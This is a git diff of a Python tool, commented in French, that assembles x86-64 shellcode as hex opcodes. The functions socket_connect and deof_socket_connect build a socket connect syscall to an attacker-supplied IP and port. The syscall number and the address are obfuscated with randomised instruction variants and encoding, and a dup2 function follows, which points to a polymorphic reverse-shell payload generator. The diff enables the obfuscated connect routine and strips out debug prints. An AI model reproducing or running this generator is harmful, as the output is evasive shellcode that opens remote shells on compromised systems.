@@ -247,15 +247,17 @@ def create_socket():
     PAYLOAD += call()
 
 
-'''
+
 def socket_connect(ip, port):
    
    global PAYLOAD
    add_string = ""
-   l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
+   # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi 
+   # | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
+   l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] 
    add_string += l[r(0,len(l)-1)]   
    add_string += clean("rax")
-   print('1:', add_string)
+
    rand = r(0,1)
    #Offuscation du socket
    if rand == 0:
@@ -264,71 +266,79 @@ def socket_connect(ip, port):
         of_string = offus("042a", random1)
         #Inverse en mirroir tout la chaine pour op code
         of_string = of_string[::-1]
-        print("2:", of_string)
-        PAYLOAD += "48bb"
         PAYLOAD+=of_string
-        print("2: ", add_string)
+
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
-        print("1", deof_string, random1, add_string)
         #Inverse en mirroir tout la chaine pour op code
         deof_string = deof_string[::-1]
-        print("3:", add_string)
+        add_string += deof_string
+
+        #PAYLOAD+=clean("rbx")       #   xor/sub rbx, rbx
+        #PAYLOAD += "48bb"           #   push rbx
+
    else :
         #Offuscation
         random1 = factorOffus("b02a")
         of_string = offus("b02a", random1)
+
         #Inverse en mirroir tout la chaine pour op code
         of_string = of_string[::-1]
-        print("2:", of_string)
-        PAYLOAD += "48bb"
         PAYLOAD+=of_string
-        print("2: ", add_string)
+
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
-        print("1", deof_string, random1, add_string)
         #Inverse en mirroir tout la chaine pour op code
         deof_string = deof_string[::-1]
-        print("3:", add_string)
+        add_string += deof_string
 
-   print("4: ", add_string) 
-   print(add_string)
-   add_string += deof_string
-   print("4.5: ", add_string) 
-   add_string += clean("rbx")
-   add_string += "53" # push rbx
+        #PAYLOAD+=clean("rbx")       #   xor/sub rbx, rbx
+        #PAYLOAD += "48bb"           #   push rbx
+
+   add_string += clean("rbx")       #   xor/sub rbx, rbx
+   add_string += "53"               #   push rbx
+
+   #Génération des IPs
    ip_greater = []
    ip_to_substract = []
    cmp = 0
-   print("5: ", add_string )
+
+   #Génère une IP supérieur à l'IP en argument
    for ip in ip.split("."):
         ip_to_substract.append(r(int(ip)+1, 255))
         ip_greater.append(ip_to_substract[cmp] - int(ip))
         cmp += 1
     
-   print("6:", add_string) 
-   add_string += "be" # mov esi
+   add_string += "be"               #   mov esi, 0xIPgreater
+
+   #Passage en hexa de l'IP supérieur
    for i in range(0,len(ip_greater)):
        if ip_greater[i] < 17: PAYLOAD += "0"
        PAYLOAD += hex(ip_greater[i])[:2]
 
-
-   add_string += "83ee" # sub esi
+   add_string += "83ee"            #   sub esi, 0xIPinferior
+   
+   #Génère en hexa de l'IP inférieur 
    for i in range(0, len(ip_to_substract)):
         if ip_to_substract[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_to_substract[i])[:2]
 
+   #Met le port en hexa 
    port = hex(socket.htons(int(port)))
-   add_string += "566668" # push
-   add_string += str(port[-4:])  
-   add_string += "666a02" #AF_INET
-   add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
-   add_string += "b218" # mov dl,24
-   add_string += call()
+
+   add_string += "566668"           #   push word ...
+   add_string += str(port[-4:])     #   ...PORT
+   add_string += "666a02"           #   push word 2 (AF_INET)
+
+   # mov rsi, rsp | add rsi, rsp 
+   add_string += "4889e6"                       #if r(0,1) else "4831f64801e6" 
+   add_string += "b218"             #   mov dl,24
+   add_string += call()             #   syscall
+
    PAYLOAD += add_string
    return PAYLOAD
-'''
 
+"""
 def deof_socket_connect(ip, port):
     global PAYLOAD
     l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
@@ -367,6 +377,7 @@ def deof_socket_connect(ip, port):
     PAYLOAD += "b218" # mov dl,24
     PAYLOAD += call()
     return PAYLOAD
+"""
 
 def dup2x3():
     global PAYLOAD
